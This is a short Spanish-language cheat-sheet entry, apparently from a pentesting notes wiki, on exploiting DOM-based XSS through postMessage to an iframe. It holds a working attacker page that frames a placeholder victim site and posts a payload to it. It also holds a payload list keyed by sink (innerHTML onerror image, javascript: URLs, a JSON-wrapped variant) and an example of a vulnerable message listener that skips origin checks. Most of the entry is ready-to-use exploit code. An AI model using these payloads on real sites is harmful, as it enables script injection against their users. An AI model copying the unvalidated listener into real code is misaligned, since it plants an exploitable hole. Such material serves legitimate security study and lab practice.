# Web Messages (postMessage) a un iframe

> La víctima tiene un `addEventListener('message', ...)` que manda `e.data` a un sink (`innerHTML`, `location`, `src`) sin validar `event.origin`. Creás el iframe por JS y le enviás el payload en su `onload`.

```html
<script>
const iframe = document.createElement('iframe');
iframe.src = 'https://VICTIMA.com/';
iframe.onload = () => {
  iframe.contentWindow.postMessage('PAYLOAD', '*');
};
document.body.appendChild(iframe);
</script>
```

**PAYLOAD según el sink**
- `innerHTML` → `<img src=x onerror=print()>`
- `location` / `src` → `javascript:print()`
- espera objeto (`JSON.parse`) → `JSON.stringify({url:'javascript:print()'})`

**Listener vulnerable (así se ve en la víctima)**
```javascript
window.addEventListener('message', e => document.getElementById('ads').innerHTML = e.data);
```

## 🔗 [[exfil-oastify]] · [[../../vulnerabilities/025-dom-based/dom-based|DOM-based]]
